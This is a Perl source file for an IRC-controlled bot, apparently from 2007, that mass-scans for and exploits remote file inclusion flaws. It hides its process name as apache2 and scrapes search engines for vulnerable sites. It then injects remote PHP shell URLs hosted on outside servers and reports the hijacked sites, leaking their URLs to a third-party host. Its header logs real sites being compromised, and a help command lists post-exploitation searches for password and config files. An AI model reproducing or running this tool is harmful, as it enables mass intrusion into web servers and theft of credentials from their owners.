#################################################################################################################################################
#!/usr/bin/perl
# 
# RFi Scanner 2007 by Morgan..Alterado by TrezZe 
#
# !scan page.php?id= "Powered by RGameScript"
# <NewScan_Google> [Scan] Started: page.php?id= - Dork: "Powered by RGameScript" Engine: Tols 
# <NewScan_Google> [Scan] Tols Found: 1656 Sites!
# <NewScan_Google> [Scan] Cleaned results: 36 Sites!
# <NewScan_Google> [Scan] Exploting started! 
# <NewScan_Google> [SafeON] [Sys Linux] [Free 36.55 GB ] http://gry.nakazdytemat.pl/page.php?id=http://usuarios.arnet.com.ar/larry123/cmd.jpg? 
# <NewScan_Google> [Information] Linux blackhawk.avx.pl 2.6.19.2 #4 SMP Fri Feb 2 11:51:02 CET 2007 i686 
# <NewScan_Google> [SafeOFF] [Sys Linux] [Free 26.26 GB ] http://allgamesallfree.org/page.php?id=http://usuarios.arnet.com.ar/larry123/cmd.jpg? 
# <NewScan_Google> [Information] Linux games.allgamesallfree.com 2.6.9-55.0.2.ELsmp #1 SMP Tue Jun 26 14:30:58 EDT 2007 i686 
# <NewScan_Google> [Scan] Scan Finished "Powered by RGameScript"
#
#
# Enjoy!
# =D
# Alterei Somente  ;D - TrEzZe
# irc.indoirc.net - Morgan
#################################################################################################################################################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

###############CONFIGURATION###################
my $processo = "/usr/sbin/apache2 -k start";
my $printcmd="http://www.animedinasty.org/cmd/info.jpg?"; #<---- Change this for your CMD 
my $server="irc.x-reaction.net";
my $porta="6667";
my $nick="____Otacon_____";
my $chan="#a";
###############END OF CONFIGURATION############

my $verbot = "2.0";
my $cmd="http://www.greenkorea.ph/bbs/data/_metal/safe.txt?"; #Never change this
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER Google 8 *  : Trezze : xD\r\n";
print $sk "JOIN $chan\r\n";
print $sk "PRIVMSG $chan :1,0[7S1,0can-Bot] Scan is 3ON1 : 1!help\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

##comands

## !help = 
if ($line=~ /PRIVMSG $chan :.help/){
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] Informations!! =D");
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] !scan 4<1bug4> <1dork4>");
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] !system 4(1Bot System4)");
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] !infolinux 4(1Linux Information4)");
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] !milw0rm 4(1Latest exploits4)");
stampa($sk, "PRIVMSG $chan :1,0[7H1,0elp] !quit 4(1Bot-Irc Quit4)");
}
### end of !help

## !system = 
if ($line=~ /PRIVMSG $chan :.system/){
$uptime=`uptime`;$id=`id`;$uname=`uname -a`;
stampa($sk, "PRIVMSG $chan :1,0[7S1,0yTem] Uname -a     : 7 $uname"); 
stampa($sk, "PRIVMSG $chan :1,0[7S1,0yTem] Uptime       : 7 $uptime");
stampa($sk, "PRIVMSG $chan :1,0[7S1,0yTem] Own-Prosses  : 7 $processo");
stampa($sk, "PRIVMSG $chan :1,0[7S1,0yTem] ID           : 7 $id");
stampa($sk, "PRIVMSG $chan :1,0[7S1,0yTem] Owner        : 7 TrEzZe");
}
### end of !system

## !helplinux =
if ($line=~ /PRIVMSG $chan :.infolinux/){
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Informations ;D");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Dir where you are : pwd");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Start a Perl file : perl file.pl");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Go back from dir : cd ..");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Force to Remove a file/dir : rm -rf file/dir;ls -la");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Show all files/dir with permissions : ls -lia");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Find config.inc.php files : find / -type f -name config.inc.php");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Find all writable folders and files : find / -perm -2 -ls");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Find all .htpasswd files : find / -type f -name .htpasswd");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] Find all service.pwd files : find / -type f -name service.pwd");
stampa($sk, "PRIVMSG $chan :1,0[7L1,0iNuX] you need + help?? --> http://www.linuxhelp.net");
}
### end of !helplinux

## !quit =
if ($line=~ /PRIVMSG $chan :.quit/){
stampa($sk, "PRIVMSG $chan :1,0[7T1,0rOxA] xD");
}
### end of !quit

## !milw0rm = 
if ($line=~ /PRIVMSG $chan :.milw0rm/){
my @ltt=();
my @bug=();
my $x;
my $page="";
my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return;
print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$socke>;
$page="@r";
close($socke);
while ($page =~  m/<title>(.*)</g){
$x = $1;
if ($x =~ /\&lt\;/) {
$x =~ s/\&lt\;/</g;
}
if ($x !~ /milw0rm/) {
push (@bug,$x);
}}
while ($page =~  m/<link.*expl.*([0-9]...)</g) {
if ($1 !~ m/milw0rm.com|exploits|en/){
push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
}}
stampa($sk, "PRIVMSG $chan :1,0[7M1,0ilw0rm] Latest exploits :");
foreach $x (0..(@ltt - 1)) {
stampa($sk, "PRIVMSG $chan :1,0[7M1,0ilw0rm] $bug[$x] - $ltt[$x]");
sleep 1;
}}
### end of !milw0rm


if ($line=~ /PRIVMSG $chan :!scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $chan :1,0[7S1,0can] Started: $bug - Dork: $dork Engine: Google ");
my @glist=&google($dork);
stampa($sk, "PRIVMSG $chan :1,0[7G1,0oogle] (".scalar(@glist).") Sites!");
my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $chan :1,0[7M1,0sn] (".scalar(@mlist).") Sites!");
my @alist=&altavista($dork);
stampa($sk, "PRIVMSG $chan :1,0[7A1,0ltavista] (".scalar(@alist).") Sites!");
my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $chan :1,0[7A1,0lltheweb] (".scalar(@allist).") Sites!");
my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $chan :1,0[7A1,0sk] (".scalar(@asklist).") Sites!");
my @uollist=&uol($dork);
stampa($sk, "PRIVMSG $chan :1,0[7U1,0ol] (".scalar(@uollist).") Sites!");
my @ylist=&yahoo($dork);
stampa($sk, "PRIVMSG $chan :1,0[7Y1,0ahOo] (".scalar(@ylist).") Sites!");
my @mamma=&mamma($dork);
stampa($sk, "PRIVMSG $chan :1,0[7M1,0amma] (".scalar(@mamma).") Sites!");
my @fireball=&fireball($dork);
stampa($sk, "PRIVMSG $chan :1,0[7F1,0ireball] (".scalar(@fireball).") Sites!");
push(my @tot, @glist, @ylist, @mlist, @alist, @allist, @asklist, @uollist, @mamma, @fireball);
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $chan :1,0[7S1,0can] Total results: ".scalar(@tot)." Sites!");
stampa($sk, "PRIVMSG $chan :1,0[7S1,0can] Cleaned results: ".scalar(@puliti)." Sites!");
stampa($sk, "PRIVMSG $chan :1,0[7S1,0can] Exploting started! ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $chan :1,0[7S1,0can] Scan Finished $dork");
#stampa($sk, "PRIVMSG $chan :1,0[7T1,0hanx] www.serapis.net");
}
my $test="http://".$sito.$bug.$cmd."?";
my $print="http://".$sito.$bug.$printcmd."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /31337/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :1,0[7S1afe4OFF1] 1,0[7S1ys4 ".$type."1] 1,0[7F1ree4 ".$space." 1] $print ");
stampa($sk, "PRIVMSG $chan :1,0[7I1nformation1]4 $ker  ");
checksafemode("$print");}}
elsif($re =~ /31337/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space,$ker)=split(/\,/,$x);
stampa($sk, "PRIVMSG $chan :1,0[7S1afe3ON1] 1,0[7S1ys3 ".$type."1] 1,0[7F1ree3 ".$space." 1] $print ");
stampa($sk, "PRIVMSG $chan :1,0[7I1nformation1]3 $ker  ");
checksafemode("$print");}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $space;
my $ker;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Kernel:(.+?)\<br>/g){
$ker=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$space=$1;
}
$str=$type.",".$space.",".$ker;
return $str;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.it/search?hl=it&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub mamma(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/"/\%22/g;
$chiave =~ s/\\/\%5C/g;
my $inizio=1;
my $pagine=25;
my @lista;
my $av=1;
while($inizio <= $pagine){
my $mamma="http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=$chiave";
my $req=HTTP::Request->new(GET=>$mamma);
my $ua=LWP::UserAgent->new();
$ua->agent('Netscape 4.78/U.S., 25-Jun-01; (c) 1995-2000');
my $response=$ua->request($req);
my $resp=$response->content;
while ($resp=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $ok="$1/";
push(@lista,$ok);
}}
$av=$av+10;
$inizio++;
}
return @lista;
}

sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=100;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $fireball="http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=fb_loc&idx=all&enc=utf-8";
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}


sub checksafemode($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"tckct.co.uk",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET /logfiles/CDPW3U1032/safe.php?url=$query HTTP/1.0\r\nHost: tckct.co.uk\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
}


sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}
return @unici;
}

